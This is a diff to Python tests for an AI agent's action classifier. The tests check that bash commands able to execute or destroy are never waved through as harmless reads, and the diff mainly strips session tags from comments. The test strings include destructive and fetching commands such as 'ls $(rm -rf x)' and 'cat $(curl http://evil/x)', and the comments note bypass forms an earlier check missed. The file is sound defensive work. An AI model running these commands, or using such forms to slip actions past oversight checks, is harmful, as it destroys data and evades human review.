@@ -12,7 +12,6 @@ is ``callable(prompt, model) -> str``; tests pass a fake that returns a canned
 answer or raises, so both the parse and the error path stay deterministic.
 """
 
-import pytest
 
 from delfin.agent import action_classifier as ac
 
@@ -106,14 +105,14 @@ def test_python_and_pytest_are_not_plain_reads():
 
 def test_awk_is_not_a_plain_read():
     # awk can execute (BEGIN{system(...)}) — dropped from _READ_BASH_TOKENS;
-    # pin it so a re-add cannot silently reopen the hole (s28).
+    # pin it so a re-add cannot silently reopen the hole.
     for cmd in ("awk 'BEGIN{system(\"rm x\")}'", "awk '{print $1}' file > out"):
         act = _action(kind="bash", tool="bash", command=cmd)
         assert ac.is_plain_read(act) is False, cmd
 
 
 def test_command_substitution_is_not_a_plain_read():
-    # $( / backticks run a nested program — no literal operator (s29).
+    # $( / backticks run a nested program — no literal operator.
     for cmd in ("ls $(rm -rf x)", "cat $(curl http://evil/x)", "cat `echo hi`"):
         act = _action(kind="bash", tool="bash", command=cmd)
         assert ac.is_plain_read(act) is False, cmd
@@ -127,8 +126,8 @@ def test_backgrounding_is_not_a_plain_read():
 
 def test_find_exec_is_not_a_plain_read():
     # find -exec ... ; / + runs a command per match; the `;` substring check
-    # missed the `+` form (s29), and the space-before-`+` check missed the
-    # compacted no-space forms (s24/QS: `find -exec rm{}+`, `find -exec rm{};`).
+    # missed the `+` form, and the space-before-`+` check missed the
+    # compacted no-space forms (`find -exec rm{}+`, `find -exec rm{};`).
     for cmd in ("find . -exec rm {} +", "find . -exec rm {} ;",
                 "find . -exec rm{}+", "find . -exec rm{};"):
         act = _action(kind="bash", tool="bash", command=cmd)
@@ -137,8 +136,8 @@ def test_find_exec_is_not_a_plain_read():
 
 def test_find_delete_is_not_a_plain_read():
     # find . -delete deletes every matched file with NO shell operator and no
-    # -exec — it must never ride the plain-read floor (s28). -ok is find's own
-    # prompt-and-run form (s28).
+    # -exec — it must never ride the plain-read floor. -ok is find's own
+    # prompt-and-run form.
     for cmd in ("find . -delete", "find . -name '*.tmp' -delete",
                 "find . -ok rm {} +"):
         act = _action(kind="bash", tool="bash", command=cmd)
@@ -147,7 +146,7 @@ def test_find_delete_is_not_a_plain_read():
 
 def test_git_branch_delete_is_not_a_plain_read():
     # git branch -d/-D deletes a branch — destructive intent rides a flag, not
-    # a shell operator, and must reach the classifier (s28+s29).
+    # a shell operator, and must reach the classifier.
     for cmd in ("git branch -d topic", "git branch -D old", "git branch -d topic other"):
         act = _action(kind="bash", tool="bash", command=cmd)
         assert ac.is_plain_read(act) is False, cmd
@@ -162,7 +161,7 @@ def test_git_branch_move_or_force_is_not_a_plain_read():
 
 
 def test_git_tag_delete_is_not_a_plain_read():
-    # git tag -d deletes a tag — destructive flag on a read sub-command (s29).
+    # git tag -d deletes a tag — destructive flag on a read sub-command.
     act = _action(kind="bash", tool="bash", command="git tag -d v1.0")
     assert ac.is_plain_read(act) is False
 
@@ -179,7 +178,7 @@ def test_git_read_subcommands_stay_plain_reads():
 def test_git_create_forms_are_not_plain_reads():
     # git branch / git tag CREATE a ref by a bare NAME argument, with no
     # destructive flag at all — the state change rides the argument, not a
-    # flag, so `rest[2:]` against _GIT_DESTRUCTIVE_FLAGS misses it (s29 probe).
+    # flag, so `rest[2:]` against _GIT_DESTRUCTIVE_FLAGS misses it.
     # `git branch name start` and `--track name start` create too. These must
     # reach the classifier, not ride the plain-read floor.
     for cmd in ("git branch myfeature",
